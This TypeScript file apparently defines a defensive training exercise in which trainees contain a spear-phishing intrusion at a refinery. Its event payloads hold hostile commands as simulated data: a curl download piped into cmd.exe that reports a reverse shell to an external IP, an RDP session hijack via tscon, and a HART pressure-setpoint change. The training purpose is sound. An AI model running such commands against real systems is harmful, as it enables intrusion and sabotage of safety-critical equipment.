/**
 * phishing.ts
 *
 * Spear-Phishing & OT Lateral Movement Attack Scenario definition.
 */

import type { AttackScenario } from "./types";
import { DEFAULT_NODES, EDGES, DEFAULT_DECISIONS } from "@/data/scenarios";

export const PHISHING_SCENARIO: AttackScenario = {
  id: "phishing",
  sector: "oil-gas",
  name: "SEVENTH-BREATH",
  code: "SEVENTH-BREATH",
  site: "Refinery Delta-12 · Tower T-A",
  byline:
    "Compressor discharge pressure walked. Safety solver disarmed. Twenty-two minutes to overpressure.",
  adversary: "SILT-2",
  protocols: "HART · FF · SIS PROFIsafe",
  description:
    "Targeted spear-phishing attack hijacking engineering workstation credentials to alter pressure solver interlocks.",
  duration: 9600,
  severity: "CRITICAL",
  mitreMapping: ["T0865", "T0886", "T0855", "T0831"],
  nodes: DEFAULT_NODES.map((n) => ({ ...n })),
  edges: EDGES.map((e) => ({ ...e })),
  decisions: DEFAULT_DECISIONS.map((d) => ({ ...d })),
  events: [
    {
      id: "p-0",
      time: 0,
      type: "network.node",
      tag: "INITIAL ACCESS",
      node: "ews-04",
      title: "Spear-phish link opened",
      desc: "Fake vendor firmware update link executed. Keylogger and reverse shell dropped.",
      sev: "MEDIUM",
      lifecycleState: "Initial Access",
      payload: {
        command: "curl -s http://update.vendor-patch.com/fw_update.exe | cmd.exe",
        output: "[+] Reverse TCP shell connected back to 45.142.214.8:8080.",
        logEntry: {
          level: "WARN",
          source: "EWS-04",
          message: "Outbound connection to unauthorized external IP on port 8080.",
        },
      },
    },
    {
      id: "p-1",
      time: 1400,
      type: "network.node",
      tag: "LATERAL",
      node: "hmi-11",
      title: "Operator session hijacked",
      desc: "Active RDP session hijacked without credentials using Tscon privileges.",
      sev: "HIGH",
      lifecycleState: "Lateral Movement",
      payload: {
        command: "tscon 2 /dest:console",
        output: "[+] Hijacked active console session ID 2. Full HMI GUI access granted.",
        logEntry: {
          level: "CRITICAL",
          source: "HMI-11",
          message: "Session shadow / disconnect on console session 2.",
        },
      },
    },
    {
      id: "p-2",
      time: 6500,
      type: "network.node",
      tag: "IMPACT",
      node: "plc-3",
      title: "Compressor setpoint increased",
      desc: "Discharge pressure setpoint increased to 8.4 bar (Max rating 7.2 bar).",
      sev: "CRITICAL",
      lifecycleState: "Impact",
      payload: {
        command: "hart-config --device 192.168.30.60 --set-pv 8.4",
        output: "[!] HART Primary Variable (PV) updated: 8.40 bar.",
        logEntry: {
          level: "CRITICAL",
          source: "PLC-3",
          message: "COMPRESSOR OVERPRESSURE WARNING: Pressure setpoint set to 8.4 bar.",
        },
        popupHint: {
          title: "COMPRESSOR OVERPRESSURE",
          text: "Discharge pressure setpoint walked above safety thresholds!",
          nodeId: "plc-3",
        },
      },
    },
  ],
  briefing: {
    overview: {
      title: "EXERCISE SEVENTH BREATH · REFINERY COMPRESSOR OVERPRESSURE",
      summary:
        "Adversary SILT-2 executed a spear-phishing attack against Refinery Delta-12 engineering personnel. The attacker hijacked active console sessions to modify HART protocol pressure setpoints on Tower T-A. Your objective is to isolate compromised controllers and restore nominal pressure loop settings before vessel overpressure occurs.",
      targetInfrastructure: "Refinery Delta-12 Hydrocracker Tower T-A",
      threatActor: "SILT-2 (Petrochemical Sabotage Group)",
      businessImpact:
        "Risk of catastrophic compressor rupture, flare stack emergency relief, and environmental release costing $8.4M.",
    },
    learningObjectives: [
      "Identify RDP session shadowing techniques.",
      "Understand HART protocol variable configuration.",
      "Contain pressure setpoint drift.",
    ],
    scope: {
      included: [
        "✔ Spear-Phishing Web Shells",
        "✔ RDP Session Hijacking (Tscon)",
        "✔ HART Setpoint Alteration",
      ],
      excluded: ["✖ Flare system flare-off manual valve operation"],
    },
    attackIntent: {
      narrative:
        "SILT-2 aims to induce overpressure in Tower T-A to force an emergency relief valve blowout.",
      attackerGoals: [
        "Harvest session tokens.",
        "Shadow operator HMI.",
        "Alter HART pressure setpoints.",
      ],
    },
    infrastructure: [
      { assetName: "EWS-04", role: "Workstation", purdueLevel: "Level 4", nodeId: "ews-04" },
      { assetName: "HMI-11", role: "Console", purdueLevel: "Level 2", nodeId: "hmi-11" },
      { assetName: "PLC-3", role: "Controller", purdueLevel: "Level 1", nodeId: "plc-3" },
    ],
    mitreOverview: [
      {
        id: "pf1",
        name: "Initial Access",
        techniqueId: "T1566",
        techniqueName: "Spearphishing Link",
        description: "Fake firmware link.",
        sequenceOrder: 1,
      },
    ],
    controls: [{ name: "Play / Pause", description: "Manage simulation clock." }],
    guidedHints: [
      {
        triggerEventId: "p-2",
        hintText:
          "Pressure setpoint walked to 8.4 bar! Air-gap PLC-3 using Kali CLI: 'isolate plc-3'.",
      },
    ],
    helpContent: {
      idleSuggestionText: "Monitor feeder pressure gauges on the dashboard.",
      commonFAQ: [
        {
          question: "How to fix pressure?",
          answer: "Use Kali CLI command 'override plc-3' to reset pressure setpoints.",
        },
      ],
    },
    commandExplanations: [],
    nodeExplanations: {},
    timelineExplanations: [],
    successCriteria: ["Prevent compressor pressure from exceeding 7.2 bar safety limit."],
  },
};
